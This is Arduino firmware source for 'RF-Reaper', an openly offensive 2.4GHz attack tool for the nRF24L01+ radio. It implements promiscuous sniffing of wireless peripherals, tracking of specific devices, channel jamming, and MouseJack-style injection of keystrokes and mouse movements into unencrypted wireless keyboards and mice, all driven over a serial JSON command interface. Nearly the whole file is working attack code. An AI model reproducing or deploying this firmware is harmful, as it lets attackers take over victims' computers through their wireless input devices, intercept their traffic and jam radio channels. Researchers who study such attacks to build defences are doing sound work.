/*
 * ══════════════════════════════════════════════════════════════
 *  ⚡ RF-REAPER FIRMWARE v1.0
 *  Unified 2.4GHz Attack Platform — Arduino nRF24L01+ Firmware
 *
 *  Capabilities:
 *    SCAN   — 126-channel spectrum sweep (carrier detect)
 *    SNIFF  — Promiscuous packet capture
 *    INJECT — Keystroke & mouse injection (MouseJack)
 *    FOLLOW — Track specific device address
 *    JAM    — Channel disruption
 *
 *  Hardware: Arduino Nano + nRF24L01+
 *  Wiring:  CE=9, CSN=10, SCK=13, MOSI=11, MISO=12
 *  Serial:  115200 baud, JSON protocol
 * ══════════════════════════════════════════════════════════════
 */

#include <SPI.h>

// ── Pin Configuration ──────────────────────────────────────────
#define CE_PIN   9
#define CSN_PIN  10

// ── nRF24L01+ Register Map ─────────────────────────────────────
#define NRF_CONFIG      0x00
#define EN_AA           0x01  // Auto-acknowledgment
#define EN_RXADDR       0x02  // Enabled RX addresses
#define SETUP_AW        0x03  // Address width
#define SETUP_RETR      0x04  // Retransmit config
#define RF_CH           0x05  // RF channel (0-125)
#define RF_SETUP        0x06  // RF setup (data rate, power)
#define NRF_STATUS      0x07  // Status register
#define OBSERVE_TX      0x08  // TX observe
#define RPD             0x09  // Received Power Detector (carrier detect)
#define RX_ADDR_P0      0x0A  // RX address pipe 0 (5 bytes)
#define RX_ADDR_P1      0x0B  // RX address pipe 1 (5 bytes)
#define TX_ADDR         0x10  // TX address (5 bytes)
#define RX_PW_P0        0x11  // RX payload width pipe 0
#define RX_PW_P1        0x12  // RX payload width pipe 1
#define FIFO_STATUS     0x17  // FIFO status
#define DYNPD           0x1C  // Dynamic payload enable
#define FEATURE         0x1D  // Feature register

// ── nRF24L01+ Commands ─────────────────────────────────────────
#define R_REGISTER      0x00  // Read register (OR with reg addr)
#define W_REGISTER      0x20  // Write register (OR with reg addr)
#define R_RX_PAYLOAD    0x61  // Read RX payload
#define W_TX_PAYLOAD    0xA0  // Write TX payload
#define FLUSH_TX        0xE1  // Flush TX FIFO
#define FLUSH_RX        0xE2  // Flush RX FIFO
#define NOP             0xFF  // No operation (read status)

// ── RF Setup Values ────────────────────────────────────────────
#define RF_2MBPS        0x08  // 2 Mbps data rate
#define RF_1MBPS        0x00  // 1 Mbps data rate
#define RF_250KBPS      0x20  // 250 kbps data rate
#define RF_MAX_POWER    0x06  // 0 dBm
#define RF_HIGH_POWER   0x04  // -6 dBm
#define RF_MED_POWER    0x02  // -12 dBm
#define RF_LOW_POWER    0x00  // -18 dBm

// ── Operating Modes ────────────────────────────────────────────
enum Mode {
  MODE_IDLE,
  MODE_SCAN,
  MODE_SNIFF,
  MODE_INJECT,
  MODE_FOLLOW,
  MODE_JAM
};

// ── Global State ───────────────────────────────────────────────
Mode currentMode = MODE_IDLE;
uint8_t currentChannel = 0;
uint8_t scanDwell = 1;           // ms per channel during scan
uint8_t sniffChannel = 0;
uint8_t followAddr[5] = {0};
bool followActive = false;
uint8_t rxBuffer[32];
char serialBuffer[512];
int serialPos = 0;

// Scan results
uint8_t scanResults[126];
uint8_t scanSweepCount = 0;

// ══════════════════════════════════════════════════════════════
// nRF24L01+ LOW-LEVEL SPI FUNCTIONS
// ══════════════════════════════════════════════════════════════

void csnLow()  { digitalWrite(CSN_PIN, LOW);  }
void csnHigh() { digitalWrite(CSN_PIN, HIGH); }
void ceLow()   { digitalWrite(CE_PIN, LOW);   }
void ceHigh()  { digitalWrite(CE_PIN, HIGH);  }

uint8_t spiTransfer(uint8_t data) {
  return SPI.transfer(data);
}

uint8_t readRegister(uint8_t reg) {
  csnLow();
  spiTransfer(R_REGISTER | (reg & 0x1F));
  uint8_t val = spiTransfer(NOP);
  csnHigh();
  return val;
}

void readRegisterMulti(uint8_t reg, uint8_t* buf, uint8_t len) {
  csnLow();
  spiTransfer(R_REGISTER | (reg & 0x1F));
  for (uint8_t i = 0; i < len; i++) {
    buf[i] = spiTransfer(NOP);
  }
  csnHigh();
}

void writeRegister(uint8_t reg, uint8_t val) {
  csnLow();
  spiTransfer(W_REGISTER | (reg & 0x1F));
  spiTransfer(val);
  csnHigh();
}

void writeRegisterMulti(uint8_t reg, const uint8_t* buf, uint8_t len) {
  csnLow();
  spiTransfer(W_REGISTER | (reg & 0x1F));
  for (uint8_t i = 0; i < len; i++) {
    spiTransfer(buf[i]);
  }
  csnHigh();
}

void flushRx() {
  csnLow();
  spiTransfer(FLUSH_RX);
  csnHigh();
}

void flushTx() {
  csnLow();
  spiTransfer(FLUSH_TX);
  csnHigh();
}

uint8_t getStatus() {
  csnLow();
  uint8_t status = spiTransfer(NOP);
  csnHigh();
  return status;
}

void clearFlags() {
  writeRegister(NRF_STATUS, 0x70);  // Clear RX_DR, TX_DS, MAX_RT
}

// ══════════════════════════════════════════════════════════════
// nRF24L01+ CONFIGURATION
// ══════════════════════════════════════════════════════════════

void nrfInit() {
  // Basic initialization
  ceLow();
  delay(5);

  writeRegister(NRF_CONFIG, 0x00);  // Power down
  delay(2);

  writeRegister(EN_AA, 0x00);       // Disable auto-acknowledgment (ALL pipes)
  writeRegister(EN_RXADDR, 0x03);   // Enable RX pipes 0 and 1
  writeRegister(SETUP_AW, 0x01);    // 3-byte address width (for promiscuous)
  writeRegister(SETUP_RETR, 0x00);  // Disable retransmit
  writeRegister(RF_CH, 0x00);       // Channel 0
  writeRegister(RF_SETUP, RF_2MBPS | RF_MAX_POWER); // 2Mbps, max power
  writeRegister(RX_PW_P0, 32);      // 32-byte payload on pipe 0
  writeRegister(RX_PW_P1, 32);      // 32-byte payload on pipe 1
  writeRegister(DYNPD, 0x00);       // Disable dynamic payload
  writeRegister(FEATURE, 0x00);     // Disable features

  flushRx();
  flushTx();
  clearFlags();

  // Power up in RX mode
  writeRegister(NRF_CONFIG, 0x0F);  // PWR_UP=1, PRIM_RX=1, EN_CRC=1, CRC 2-byte
  delay(2);
  ceHigh();
}

void setChannel(uint8_t ch) {
  if (ch > 125) ch = 125;
  ceLow();
  writeRegister(RF_CH, ch);
  ceHigh();
  currentChannel = ch;
}

void setAddress(uint8_t pipe, const uint8_t* addr, uint8_t len) {
  uint8_t reg = (pipe == 0) ? RX_ADDR_P0 : RX_ADDR_P1;
  writeRegisterMulti(reg, addr, len);
}

void setTxAddress(const uint8_t* addr, uint8_t len) {
  writeRegisterMulti(TX_ADDR, addr, len);
  writeRegisterMulti(RX_ADDR_P0, addr, len);  // For auto-ack
}

void setDataRate(uint8_t rate) {
  uint8_t setup = readRegister(RF_SETUP) & 0xD7;  // Clear rate bits
  setup |= rate;
  writeRegister(RF_SETUP, setup);
}

// ══════════════════════════════════════════════════════════════
// PROMISCUOUS MODE SETUP
// Technique from Travis Goodspeed / MouseJack research
// Uses a 2-byte address (0x00AA) to capture preamble + data
// ══════════════════════════════════════════════════════════════

void setupPromiscuous() {
  ceLow();

  // 2-byte address width (minimum)
  writeRegister(SETUP_AW, 0x00);  // Illegal value → actually 2 bytes on some chips
  // Some clones need 0x01 for 3-byte, so we try the safer approach:
  writeRegister(SETUP_AW, 0x01);  // 3-byte address

  // Promiscuous address: catches many packets
  // 0x00AA and 0x0055 are good for catching preamble transitions
  uint8_t promiscAddr[] = {0xAA, 0x00, 0x00};
  setAddress(0, promiscAddr, 3);

  // Also listen on 0x55 pattern
  uint8_t promiscAddr2[] = {0x55, 0x00, 0x00};
  setAddress(1, promiscAddr2, 3);

  // Disable CRC for promiscuous mode
  writeRegister(NRF_CONFIG, 0x03);  // PWR_UP=1, PRIM_RX=1, no CRC

  // Max payload width
  writeRegister(RX_PW_P0, 32);
  writeRegister(RX_PW_P1, 32);

  // Disable auto-ack
  writeRegister(EN_AA, 0x00);

  // Enable both pipes
  writeRegister(EN_RXADDR, 0x03);

  flushRx();
  clearFlags();

  ceHigh();
}

// Setup for targeted sniffing (with known address)
void setupTargeted(const uint8_t* addr, uint8_t addrLen) {
  ceLow();

  // Set proper address width
  writeRegister(SETUP_AW, addrLen - 2);  // 0x01=3bytes, 0x02=4bytes, 0x03=5bytes

  setAddress(0, addr, addrLen);

  // Enable CRC for less noise
  writeRegister(NRF_CONFIG, 0x0F);  // PWR_UP, PRIM_RX, CRC enabled

  writeRegister(RX_PW_P0, 32);
  writeRegister(EN_AA, 0x00);      // Still no auto-ack
  writeRegister(EN_RXADDR, 0x01);  // Only pipe 0

  flushRx();
  clearFlags();

  ceHigh();
}

// Setup for TX (injection)
void setupTx(const uint8_t* addr, uint8_t addrLen) {
  ceLow();

  writeRegister(SETUP_AW, addrLen - 2);
  setTxAddress(addr, addrLen);

  // TX mode with CRC (to match target device expectations)
  writeRegister(NRF_CONFIG, 0x0E);  // PWR_UP=1, PRIM_RX=0, CRC enabled
  writeRegister(EN_AA, 0x00);       // No auto-ack
  writeRegister(SETUP_RETR, 0x00);  // No retransmit

  flushTx();
  clearFlags();
}

// ══════════════════════════════════════════════════════════════
// PACKET RECEPTION
// ══════════════════════════════════════════════════════════════

bool receivePacket(uint8_t* buf, uint8_t* pipe) {
  uint8_t status = getStatus();

  if (status & 0x40) {  // RX_DR flag
    *pipe = (status >> 1) & 0x07;

    // Read payload
    csnLow();
    spiTransfer(R_RX_PAYLOAD);
    for (uint8_t i = 0; i < 32; i++) {
      buf[i] = spiTransfer(NOP);
    }
    csnHigh();

    // Clear flag
    writeRegister(NRF_STATUS, 0x40);

    return true;
  }

  return false;
}

// ══════════════════════════════════════════════════════════════
// PACKET TRANSMISSION (INJECTION)
// ══════════════════════════════════════════════════════════════

bool transmitPacket(const uint8_t* payload, uint8_t len) {
  flushTx();
  clearFlags();

  // Write payload
  csnLow();
  spiTransfer(W_TX_PAYLOAD);
  for (uint8_t i = 0; i < len; i++) {
    spiTransfer(payload[i]);
  }
  // Pad to 32 bytes
  for (uint8_t i = len; i < 32; i++) {
    spiTransfer(0x00);
  }
  csnHigh();

  // Pulse CE to transmit
  ceHigh();
  delayMicroseconds(15);
  ceLow();

  // Wait for TX complete or MAX_RT
  uint32_t start = millis();
  while (millis() - start < 50) {
    uint8_t status = getStatus();
    if (status & 0x20) {  // TX_DS (Data Sent)
      clearFlags();
      return true;
    }
    if (status & 0x10) {  // MAX_RT
      clearFlags();
      flushTx();
      return false;
    }
  }

  flushTx();
  clearFlags();
  return false;
}

// ══════════════════════════════════════════════════════════════
// SCAN MODE — Spectrum Sweep
// Carrier detect on all 126 channels
// ══════════════════════════════════════════════════════════════

void doScan() {
  memset(scanResults, 0, sizeof(scanResults));

  // Multiple sweeps for better detection
  for (uint8_t sweep = 0; sweep < 3; sweep++) {
    for (uint8_t ch = 0; ch < 126; ch++) {
      setChannel(ch);
      delayMicroseconds(200);  // Settle time

      // Check RPD (Received Power Detector)
      // Signal > -64 dBm sets RPD
      if (readRegister(RPD)) {
        scanResults[ch]++;
      }

      // Also check if any packet received
      uint8_t status = getStatus();
      if (status & 0x40) {
        scanResults[ch] += 3;  // Strong indication
        flushRx();
        writeRegister(NRF_STATUS, 0x70);
      }

      // Check for serial commands
      if (Serial.available()) return;
    }
  }

  scanSweepCount++;

  // Send results as JSON
  Serial.print(F("{\"type\":\"scan_complete\",\"sweep\":"));
  Serial.print(scanSweepCount);
  Serial.print(F(",\"data\":["));
  for (uint8_t i = 0; i < 126; i++) {
    if (i > 0) Serial.print(',');
    Serial.print(scanResults[i]);
  }
  Serial.println(F("]}"));

  // Also report individual hot channels
  for (uint8_t i = 0; i < 126; i++) {
    if (scanResults[i] >= 2) {
      Serial.print(F("{\"type\":\"scan_result\",\"ch\":"));
      Serial.print(i);
      Serial.print(F(",\"strength\":"));
      Serial.print(scanResults[i]);
      Serial.print(F(",\"freq\":"));
      Serial.print(2400 + i);
      Serial.println(F("}"));
    }
  }
}

// ══════════════════════════════════════════════════════════════
// SNIFF MODE — Promiscuous Packet Capture
// ══════════════════════════════════════════════════════════════

void doSniff() {
  uint8_t pipe;
  if (receivePacket(rxBuffer, &pipe)) {
    // Check if packet is not all zeros or all FFs (noise)
    bool allZero = true;
    bool allFF = true;
    for (uint8_t i = 0; i < 32; i++) {
      if (rxBuffer[i] != 0x00) allZero = false;
      if (rxBuffer[i] != 0xFF) allFF = false;
    }

    if (!allZero && !allFF) {
      // Valid packet captured
      Serial.print(F("{\"type\":\"packet\",\"ch\":"));
      Serial.print(currentChannel);
      Serial.print(F(",\"pipe\":"));
      Serial.print(pipe);
      Serial.print(F(",\"len\":32,\"raw\":\""));
      for (uint8_t i = 0; i < 32; i++) {
        if (rxBuffer[i] < 0x10) Serial.print('0');
        Serial.print(rxBuffer[i], HEX);
      }
      Serial.print(F("\",\"addr\":\""));
      // Extract probable address from first bytes
      for (uint8_t i = 0; i < 5; i++) {
        if (i > 0) Serial.print(':');
        if (rxBuffer[i] < 0x10) Serial.print('0');
        Serial.print(rxBuffer[i], HEX);
      }
      Serial.println(F("\"}"));
    }
  }
}

// Sniff with channel hopping (for discovery)
void doSniffHop() {
  static uint8_t hopChannel = 0;
  static unsigned long lastHop = 0;

  if (millis() - lastHop > 50) {  // Hop every 50ms
    hopChannel = (hopChannel + 1) % 126;
    setChannel(hopChannel);
    lastHop = millis();
  }

  doSniff();
}

// ══════════════════════════════════════════════════════════════
// FOLLOW MODE — Track Specific Device
// ══════════════════════════════════════════════════════════════

void doFollow() {
  uint8_t pipe;
  if (receivePacket(rxBuffer, &pipe)) {
    Serial.print(F("{\"type\":\"packet\",\"ch\":"));
    Serial.print(currentChannel);
    Serial.print(F(",\"mode\":\"follow\",\"len\":32,\"raw\":\""));
    for (uint8_t i = 0; i < 32; i++) {
      if (rxBuffer[i] < 0x10) Serial.print('0');
      Serial.print(rxBuffer[i], HEX);
    }
    Serial.print(F("\",\"addr\":\""));
    for (uint8_t i = 0; i < 5; i++) {
      if (i > 0) Serial.print(':');
      if (followAddr[i] < 0x10) Serial.print('0');
      Serial.print(followAddr[i], HEX);
    }
    Serial.println(F("\"}"));
  }
}

// ══════════════════════════════════════════════════════════════
// JAM MODE — Channel Disruption
// ══════════════════════════════════════════════════════════════

void doJam() {
  // Continuous transmit of noise on the target channel
  uint8_t noise[32];
  for (uint8_t i = 0; i < 32; i++) {
    noise[i] = random(256);
  }

  setupTx(followAddr, 5);
  setChannel(currentChannel);

  for (uint8_t i = 0; i < 10; i++) {
    transmitPacket(noise, 32);
  }

  // Back to RX briefly to check for serial commands
  writeRegister(NRF_CONFIG, 0x0F);
  ceHigh();
}

// ══════════════════════════════════════════════════════════════
// INJECTION — MouseJack Style
// ══════════════════════════════════════════════════════════════

void injectKeystroke(uint8_t modifier, uint8_t keycode) {
  /*
   * Unencrypted HID keyboard report format:
   * Byte 0: Device type (0x00 for keyboard on many devices)
   * Byte 1: HID modifier bitmask
   * Byte 2: Reserved (0x00)
   * Byte 3: Keycode 1
   * Byte 4-8: Keycodes 2-6
   * Byte 9: Checksum (varies by device)
   *
   * Note: Exact format depends on the target device's protocol.
   * This is the generic Logitech Unifying format.
   */
  uint8_t payload[10] = {0};
  payload[0] = 0x00;      // Frame type: keyboard
  payload[1] = modifier;  // Modifier keys
  payload[2] = 0x00;      // Reserved
  payload[3] = keycode;   // Key 1

  if (transmitPacket(payload, 10)) {
    Serial.println(F("{\"type\":\"inject_ok\",\"key\":true}"));
  } else {
    Serial.println(F("{\"type\":\"inject_fail\",\"error\":\"TX failed\"}"));
  }
}

void injectMouse(int8_t x, int8_t y, uint8_t buttons) {
  /*
   * Unencrypted HID mouse report format:
   * Byte 0: Device type (0x01 for mouse)
   * Byte 1: Button mask
   * Byte 2: X movement (signed)
   * Byte 3: Y movement (signed)
   * Byte 4: Wheel
   */
  uint8_t payload[7] = {0};
  payload[0] = 0x01;      // Frame type: mouse
  payload[1] = buttons;
  payload[2] = (uint8_t)x;
  payload[3] = (uint8_t)y;

  if (transmitPacket(payload, 7)) {
    Serial.println(F("{\"type\":\"inject_ok\",\"mouse\":true}"));
  } else {
    Serial.println(F("{\"type\":\"inject_fail\",\"error\":\"TX failed\"}"));
  }
}

// ══════════════════════════════════════════════════════════════
// SERIAL JSON COMMAND PARSER
// ══════════════════════════════════════════════════════════════

void processCommand(const char* json) {
  // Simple JSON parser (no external library needed)
  // Extracts "cmd" and basic "params"

  // Find "cmd" value
  const char* cmdPtr = strstr(json, "\"cmd\"");
  if (!cmdPtr) {
    Serial.println(F("{\"type\":\"error\",\"msg\":\"No cmd field\"}"));
    return;
  }

  // Extract command string
  const char* valStart = strchr(cmdPtr + 5, '"');
  if (!valStart) return;
  valStart++;
  const char* valEnd = strchr(valStart, '"');
  if (!valEnd) return;

  char cmd[32] = {0};
  uint8_t cmdLen = min((int)(valEnd - valStart), 31);
  strncpy(cmd, valStart, cmdLen);

  // ── PING ──
  if (strcmp(cmd, "ping") == 0) {
    Serial.println(F("{\"type\":\"pong\",\"fw\":\"RF-Reaper v1.0\",\"hw\":\"nRF24L01+\"}"));
  }

  // ── SCAN ──
  else if (strcmp(cmd, "scan") == 0) {
    // Extract dwell time
    const char* dwellPtr = strstr(json, "\"dwell\"");
    if (dwellPtr) {
      const char* numStart = dwellPtr + 8;
      scanDwell = atoi(numStart);
      if (scanDwell < 1) scanDwell = 1;
      if (scanDwell > 100) scanDwell = 100;
    }

    currentMode = MODE_SCAN;
    nrfInit();  // Reset to clean state
    Serial.print(F("{\"type\":\"debug\",\"msg\":\"Scan started, dwell="));
    Serial.print(scanDwell);
    Serial.println(F("ms\"}"));
  }

  // ── SNIFF ──
  else if (strcmp(cmd, "sniff") == 0) {
    // Extract channel
    const char* chPtr = strstr(json, "\"channel\"");
    uint8_t ch = 0;
    if (chPtr) {
      ch = atoi(chPtr + 10);
    }

    // Extract address (optional)
    const char* addrPtr = strstr(json, "\"address\"");
    bool hasAddr = false;
    uint8_t addr[5] = {0};

    if (addrPtr) {
      const char* addrStr = strchr(addrPtr + 10, '"');
      if (addrStr && *(addrStr + 1) != '"') {
        addrStr++;
        // Parse "AA:BB:CC:DD:EE" format
        for (int i = 0; i < 5; i++) {
          char hexBuf[3] = {addrStr[i * 3], addrStr[i * 3 + 1], 0};
          addr[i] = strtol(hexBuf, NULL, 16);
        }
        hasAddr = true;
      }
    }

    if (hasAddr) {
      setupTargeted(addr, 5);
    } else {
      setupPromiscuous();
    }

    setChannel(ch);
    sniffChannel = ch;
    currentMode = MODE_SNIFF;

    Serial.print(F("{\"type\":\"debug\",\"msg\":\"Sniffing ch"));
    Serial.print(ch);
    if (hasAddr) {
      Serial.print(F(" addr="));
      for (int i = 0; i < 5; i++) {
        if (i > 0) Serial.print(':');
        if (addr[i] < 0x10) Serial.print('0');
        Serial.print(addr[i], HEX);
      }
    } else {
      Serial.print(F(" promiscuous"));
    }
    Serial.println(F("\"}"));
  }

  // ── FOLLOW ──
  else if (strcmp(cmd, "follow") == 0) {
    const char* addrPtr = strstr(json, "\"address\"");
    if (addrPtr) {
      const char* addrStr = strchr(addrPtr + 10, '"');
      if (addrStr) {
        addrStr++;
        for (int i = 0; i < 5; i++) {
          char hexBuf[3] = {addrStr[i * 3], addrStr[i * 3 + 1], 0};
          followAddr[i] = strtol(hexBuf, NULL, 16);
        }
        followActive = true;
        setupTargeted(followAddr, 5);
        currentMode = MODE_FOLLOW;

        Serial.print(F("{\"type\":\"debug\",\"msg\":\"Following "));
        for (int i = 0; i < 5; i++) {
          if (i > 0) Serial.print(':');
          if (followAddr[i] < 0x10) Serial.print('0');
          Serial.print(followAddr[i], HEX);
        }
        Serial.println(F("\"}"));
      }
    }
  }

  // ── INJECT RAW ──
  else if (strcmp(cmd, "inject_raw") == 0) {
    const char* addrPtr = strstr(json, "\"address\"");
    const char* chPtr = strstr(json, "\"channel\"");
    const char* rawPtr = strstr(json, "\"raw\"");

    uint8_t addr[5] = {0};
    uint8_t ch = 0;
    uint8_t payload[32] = {0};
    uint8_t payloadLen = 0;

    if (chPtr) ch = atoi(chPtr + 10);

    if (addrPtr) {
      const char* addrStr = strchr(addrPtr + 10, '"') + 1;
      for (int i = 0; i < 5; i++) {
        char hexBuf[3] = {addrStr[i * 3], addrStr[i * 3 + 1], 0};
        addr[i] = strtol(hexBuf, NULL, 16);
      }
    }

    if (rawPtr) {
      const char* rawStr = strchr(rawPtr + 6, '"') + 1;
      while (*rawStr && *rawStr != '"' && payloadLen < 32) {
        char hexBuf[3] = {rawStr[0], rawStr[1], 0};
        payload[payloadLen++] = strtol(hexBuf, NULL, 16);
        rawStr += 2;
      }
    }

    setupTx(addr, 5);
    setChannel(ch);

    if (transmitPacket(payload, payloadLen)) {
      Serial.print(F("{\"type\":\"inject_ok\",\"bytes\":"));
      Serial.print(payloadLen);
      Serial.println(F("}"));
    } else {
      Serial.println(F("{\"type\":\"inject_fail\",\"error\":\"TX timeout\"}"));
    }

    // Return to RX mode
    writeRegister(NRF_CONFIG, 0x0F);
    ceHigh();
  }

  // ── INJECT KEYSTROKE ──
  else if (strcmp(cmd, "inject_key") == 0) {
    const char* addrPtr = strstr(json, "\"address\"");
    const char* chPtr = strstr(json, "\"channel\"");
    const char* modPtr = strstr(json, "\"modifier\"");
    const char* keyPtr = strstr(json, "\"key\"");

    uint8_t addr[5] = {0};
    uint8_t ch = 0;
    uint8_t modifier = 0;
    uint8_t keycode = 0;

    if (chPtr) ch = atoi(chPtr + 10);
    if (modPtr) modifier = atoi(modPtr + 11);
    if (keyPtr) keycode = atoi(keyPtr + 6);

    if (addrPtr) {
      const char* addrStr = strchr(addrPtr + 10, '"') + 1;
      for (int i = 0; i < 5; i++) {
        char hexBuf[3] = {addrStr[i * 3], addrStr[i * 3 + 1], 0};
        addr[i] = strtol(hexBuf, NULL, 16);
      }
    }

    setupTx(addr, 5);
    setChannel(ch);
    injectKeystroke(modifier, keycode);

    // Key release
    delay(10);
    injectKeystroke(0, 0);

    writeRegister(NRF_CONFIG, 0x0F);
    ceHigh();
  }

  // ── INJECT MOUSE ──
  else if (strcmp(cmd, "inject_mouse") == 0) {
    const char* addrPtr = strstr(json, "\"address\"");
    const char* chPtr = strstr(json, "\"channel\"");
    const char* xPtr = strstr(json, "\"x\"");
    const char* yPtr = strstr(json, "\"y\"");
    const char* btnPtr = strstr(json, "\"buttons\"");

    uint8_t addr[5] = {0};
    uint8_t ch = 0;
    int8_t x = 0, y = 0;
    uint8_t buttons = 0;

    if (chPtr) ch = atoi(chPtr + 10);
    if (xPtr) x = atoi(xPtr + 4);
    if (yPtr) y = atoi(yPtr + 4);
    if (btnPtr) buttons = atoi(btnPtr + 10);

    if (addrPtr) {
      const char* addrStr = strchr(addrPtr + 10, '"') + 1;
      for (int i = 0; i < 5; i++) {
        char hexBuf[3] = {addrStr[i * 3], addrStr[i * 3 + 1], 0};
        addr[i] = strtol(hexBuf, NULL, 16);
      }
    }

    setupTx(addr, 5);
    setChannel(ch);
    injectMouse(x, y, buttons);

    writeRegister(NRF_CONFIG, 0x0F);
    ceHigh();
  }

  // ── INJECT SEQUENCE (DuckyScript) ──
  else if (strcmp(cmd, "inject_sequence") == 0) {
    // For sequences, the host sends individual inject_key commands
    // This command just sets up the TX target
    const char* addrPtr = strstr(json, "\"address\"");
    const char* chPtr = strstr(json, "\"channel\"");

    uint8_t addr[5] = {0};
    uint8_t ch = 0;

    if (chPtr) ch = atoi(chPtr + 10);
    if (addrPtr) {
      const char* addrStr = strchr(addrPtr + 10, '"') + 1;
      for (int i = 0; i < 5; i++) {
        char hexBuf[3] = {addrStr[i * 3], addrStr[i * 3 + 1], 0};
        addr[i] = strtol(hexBuf, NULL, 16);
      }
    }

    setupTx(addr, 5);
    setChannel(ch);

    Serial.print(F("{\"type\":\"debug\",\"msg\":\"TX ready on ch"));
    Serial.print(ch);
    Serial.println(F(", send inject_key commands\"}"));
  }

  // ── JAM ──
  else if (strcmp(cmd, "jam") == 0) {
    const char* chPtr = strstr(json, "\"channel\"");
    if (chPtr) setChannel(atoi(chPtr + 10));
    currentMode = MODE_JAM;
    Serial.print(F("{\"type\":\"debug\",\"msg\":\"Jamming ch"));
    Serial.print(currentChannel);
    Serial.println(F("\"}"));
  }

  // ── STOP ──
  else if (strcmp(cmd, "stop") == 0) {
    currentMode = MODE_IDLE;
    nrfInit();
    Serial.println(F("{\"type\":\"debug\",\"msg\":\"Stopped\"}"));
  }

  // ── SET CHANNEL ──
  else if (strcmp(cmd, "set_channel") == 0) {
    const char* chPtr = strstr(json, "\"channel\"");
    if (chPtr) {
      uint8_t ch = atoi(chPtr + 10);
      setChannel(ch);
      Serial.print(F("{\"type\":\"debug\",\"msg\":\"Channel set to "));
      Serial.print(ch);
      Serial.println(F("\"}"));
    }
  }

  // ── SET DATA RATE ──
  else if (strcmp(cmd, "set_rate") == 0) {
    const char* ratePtr = strstr(json, "\"rate\"");
    if (ratePtr) {
      int rate = atoi(ratePtr + 7);
      switch (rate) {
        case 250:  setDataRate(RF_250KBPS); break;
        case 1000: setDataRate(RF_1MBPS);   break;
        case 2000: setDataRate(RF_2MBPS);   break;
      }
      Serial.print(F("{\"type\":\"debug\",\"msg\":\"Rate set to "));
      Serial.print(rate);
      Serial.println(F("kbps\"}"));
    }
  }

  // ── REGISTER READ ──
  else if (strcmp(cmd, "read_reg") == 0) {
    const char* regPtr = strstr(json, "\"reg\"");
    if (regPtr) {
      uint8_t reg = atoi(regPtr + 6);
      uint8_t val = readRegister(reg);
      Serial.print(F("{\"type\":\"reg\",\"reg\":"));
      Serial.print(reg);
      Serial.print(F(",\"val\":"));
      Serial.print(val);
      Serial.println(F("}"));
    }
  }

  // ── STATUS ──
  else if (strcmp(cmd, "status") == 0) {
    uint8_t status = getStatus();
    uint8_t config = readRegister(NRF_CONFIG);
    uint8_t ch = readRegister(RF_CH);
    uint8_t rfSetup = readRegister(RF_SETUP);

    Serial.print(F("{\"type\":\"status\",\"mode\":"));
    Serial.print(currentMode);
    Serial.print(F(",\"status\":"));
    Serial.print(status);
    Serial.print(F(",\"config\":"));
    Serial.print(config);
    Serial.print(F(",\"channel\":"));
    Serial.print(ch);
    Serial.print(F(",\"rf_setup\":"));
    Serial.print(rfSetup);
    Serial.println(F("}"));
  }

  // ── UNKNOWN ──
  else {
    Serial.print(F("{\"type\":\"error\",\"msg\":\"Unknown cmd: "));
    Serial.print(cmd);
    Serial.println(F("\"}"));
  }
}

// ══════════════════════════════════════════════════════════════
// ARDUINO SETUP & LOOP
// ══════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  while (!Serial) delay(1);

  // Init SPI
  pinMode(CE_PIN, OUTPUT);
  pinMode(CSN_PIN, OUTPUT);
  ceLow();
  csnHigh();
  SPI.begin();
  SPI.setBitOrder(MSBFIRST);
  SPI.setDataMode(SPI_MODE0);
  SPI.setClockDivider(SPI_CLOCK_DIV4);

  // Init nRF24L01+
  nrfInit();

  // Startup message
  Serial.println(F("{\"type\":\"boot\",\"fw\":\"RF-Reaper v1.0\",\"hw\":\"nRF24L01+\",\"pins\":{\"CE\":9,\"CSN\":10}}"));
}

void loop() {
  // ── Check for serial commands ──
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (serialPos > 0) {
        serialBuffer[serialPos] = '\0';
        processCommand(serialBuffer);
        serialPos = 0;
      }
    } else if (serialPos < (int)sizeof(serialBuffer) - 1) {
      serialBuffer[serialPos++] = c;
    }
  }

  // ── Execute current mode ──
  switch (currentMode) {
    case MODE_SCAN:
      doScan();
      break;

    case MODE_SNIFF:
      if (sniffChannel == 0) {
        doSniffHop();  // Channel hopping
      } else {
        doSniff();     // Fixed channel
      }
      break;

    case MODE_FOLLOW:
      doFollow();
      break;

    case MODE_JAM:
      doJam();
      break;

    case MODE_IDLE:
    default:
      delay(10);
      break;
  }
}
